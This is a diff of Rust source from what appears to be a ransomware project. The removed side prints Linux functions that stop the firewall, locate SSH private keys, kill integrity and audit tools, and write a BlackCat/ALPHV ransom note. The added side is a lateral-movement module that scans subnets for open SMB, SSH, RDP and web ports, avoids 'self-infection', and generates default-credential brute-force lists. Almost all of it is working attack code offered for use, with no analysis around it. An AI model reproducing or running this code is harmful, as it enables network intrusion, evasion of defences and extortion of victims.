@@ -1,118 +1,137 @@
-// src/linux.rs
-#[cfg(target_os = "linux")]
-use std::process::Command;
+// src/lateral_movement.rs
+use std::net::{TcpStream, SocketAddr};
+use std::time::Duration;
+use log::{info, debug};
+use local_ip_address::local_ip; // Используем новую библиотеку
 
-pub struct LinuxOperations;
+pub struct LateralMovement;
 
-impl LinuxOperations {
-    #[cfg(target_os = "linux")]
-    pub fn disable_firewall() -> Result<(), String> {
-        let output = Command::new("sudo")
-            .args(&["systemctl", "stop", "ufw"])
-            .output();
+impl LateralMovement {
+    // Обнаружение хостов в сети
+    pub fn discover_hosts(network: &str, start: u8, end: u8) -> Vec<String> {
+        let mut hosts = Vec::new();
+        let network_parts: Vec<&str> = network.split('.').collect();
+        
+        if network_parts.len() != 3 {
+            return hosts;
+        }
+        
+        // Определяем свой локальный IP, чтобы пропустить его
+        let my_ip = local_ip().ok().map(|ip| ip.to_string()).unwrap_or_default();
+        info!("My local IP is: {}. Skipping self-infection.", my_ip);
 
-        match output {
-            Ok(result) => {
-                if result.status.success() {
-                    Ok(())
-                } else {
-                    Err("Failed to disable firewall".to_string())
+        let base = format!("{}.{}.{}", network_parts[0], network_parts[1], network_parts[2]);
+        
+        for i in start..=end {
+            let ip = format!("{}.{}", base, i);
+            
+            // 1. Пропускаем САМОГО СЕБЯ
+            if ip == my_ip {
+                debug!("Skipping localhost: {}", ip);
+                continue;
+            }
+
+            // 2. Пропускаем определенные IP адреса (blacklist)
+            if Self::should_skip_ip(&ip) {
+                continue;
+            }
+            
+            // 3. Проверяем доступность
+            if Self::is_host_alive(&ip) {
+                info!("Discovered active host: {}", ip);
+                hosts.push(ip);
+            }
+        }
+        
+        hosts
+    }
+    
+    fn should_skip_ip(ip: &str) -> bool {
+        // Пропускаем Kali и другие служебные хосты
+        if ip.starts_with("192.168.53.") {
+            if let Some(last_part) = ip.split('.').last() {
+                if let Ok(num) = last_part.parse::<u8>() {
+                    // Например, диапазон админов
+                    return num >= 1 && num <= 10;
                 }
             }
-            Err(e) => Err(format!("Firewall disable failed: {}", e)),
         }
+        false
     }
-
-    #[cfg(target_os = "linux")]
-    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> {
-        let output = Command::new("find")
-            .args(&["/home", "-name", "id_rsa", "-o", "-name", "id_ed25519"])
-            .output();
-
-        match output {
-            Ok(result) => {
-                let stdout = String::from_utf8_lossy(&result.stdout);
-                Ok(stdout.lines().map(|s| s.to_string()).collect())
+    
+    fn is_host_alive(ip: &str) -> bool {
+        // Проверяем популярные порты
+        let ports = [445, 22, 3389, 80, 8080]; 
+        for &port in &ports {
+            if Self::check_port(ip, port, 200) {
+                return true;
             }
-            Err(e) => Err(format!("SSH key enumeration failed: {}", e)),
         }
+        false
     }
-
-    #[cfg(target_os = "linux")]
-    pub fn kill_security_processes() -> Result<(), String> {
-        let processes = vec!["aide", "tripwire", "osquery", "auditd"];
+    
+    pub fn check_port(ip: &str, port: u16, timeout_ms: u64) -> bool {
+        let addr: SocketAddr = format!("{}:{}", ip, port)
+            .parse()
+            .unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap());
         
-        for process in processes {
-            let _ = Command::new("pkill")
-                .args(&["-9", process])
-                .output();
+        match TcpStream::connect_timeout(&addr, Duration::from_millis(timeout_ms)) {
+            Ok(_) => true,
+            Err(_) => false,
         }
-
-        Ok(())
+    }
+    
+    #[cfg(target_os = "windows")]
+    pub fn harvest_credentials() -> Vec<(String, String, String)> {
+        // (Оставляем как было в твоем коде)
+        use std::process::Command;
+        let mut credentials = Vec::new();
+        
+        let output = Command::new("cmd")
+            .args(&["/c", "echo %USERNAME% & echo %USERDOMAIN%"])
+            .output();
+        
+        if let Ok(result) = output {
+            let stdout = String::from_utf8_lossy(&result.stdout);
+            let lines: Vec<&str> = stdout.lines().collect();
+            
+            if lines.len() >= 2 {
+                let username = lines[0].trim().to_string();
+                let domain = lines[1].trim().to_string();
+                credentials.push((username.clone(), "".to_string(), domain));
+            }
+        }
+        
+        credentials.push(("Administrator".to_string(), "".to_string(), "".to_string()));
+        credentials.push(("admin".to_string(), "".to_string(), "".to_string()));
+        credentials.push(("user".to_string(), "".to_string(), "".to_string()));
+        credentials.push(("root".to_string(), "".to_string(), "".to_string())); // Для Linux брута
+        
+        // Генерация комбинаций
+        let common_passwords = vec!["", "password", "123456", "admin", "P@ssw0rd", "qwerty", "toor", "root"];
+        let mut expanded_creds = Vec::new();
+        
+        for (user, _, domain) in credentials {
+            for pass in &common_passwords {
+                expanded_creds.push((user.clone(), pass.to_string(), domain.clone()));
+            }
+        }
+        
+        expanded_creds
     }
 
-    /// Создает записку с требованием выкупа в указанной директории (Linux-версия)
+    // Для Linux версия харвестинга (простая заглушка с дефолтными кредами)
     #[cfg(target_os = "linux")]
-    pub fn create_ransom_note(directory: &str, exfil_report: &str) -> Result<(), String> {
-        let ransom_content = format!(
-r#"-->> BLACKCAT/ALPHV RANSOMWARE <<--
-
-Your important files have been ENCRYPTED and now have ".sttp" extension.
-
-YOUR DATA HAS BEEN EXFILTRATED!
-All sensitive data from your system has been downloaded to our servers.
-This includes:
-- SSH keys and configuration
-- Database files
-- Web application source code
-- User documents and credentials
-
-If you refuse to pay, all data will be PUBLISHED on our leak site.
-
-EXFILTRATED DATA REPORT:
-{}
-
-CAUTION
-DO NOT MODIFY FILES YOURSELF.
-DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
-YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
-YOUR DATA IS STRONGLY ENCRYPTED WITH AES-256-GCM.
-
-Recovery procedure:
-1. Download and install Tor Browser: https://torproject.org/
-2. Navigate to: http://blackcat-site.onion/
-3. Enter your personal decryption key
-
-Your decryption key will be provided after payment.
-
-=== DO NOT SHARE THIS KEY WITH ANYONE ===
-"#, exfil_report);
-
-        let note_path = format!("{}/README_BLACKCAT.txt", directory);
-        std::fs::write(&note_path, ransom_content)
-            .map_err(|e| format!("Failed to create ransom note: {}", e))?;
-
-        Ok(())
-    }
-
-    // Заглушки для компиляции на других ОС
-    #[cfg(not(target_os = "linux"))]
-    pub fn disable_firewall() -> Result<(), String> {
-        Err("Firewall disable only available on Linux".to_string())
-    }
-
-    #[cfg(not(target_os = "linux"))]
-    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> {
-        Err("SSH enumeration only available on Linux".to_string())
-    }
-
-    #[cfg(not(target_os = "linux"))]
-    pub fn kill_security_processes() -> Result<(), String> {
-        Err("Process killing only available on Linux".to_string())
-    }
-
-    #[cfg(not(target_os = "linux"))]
-    pub fn create_ransom_note(_directory: &str, _exfil_report: &str) -> Result<(), String> {
-        Err("Ransom note creation only available on Linux".to_string())
+    pub fn harvest_credentials() -> Vec<(String, String, String)> {
+        let mut creds = Vec::new();
+        let users = vec!["root", "admin", "user", "ubuntu", "kali"];
+        let passwords = vec!["password", "123456", "toor", "root", "admin", "qwerty"];
+        
+        for u in users {
+            for p in &passwords {
+                creds.push((u.to_string(), p.to_string(), "".to_string()));
+            }
+        }
+        creds
     }
 }
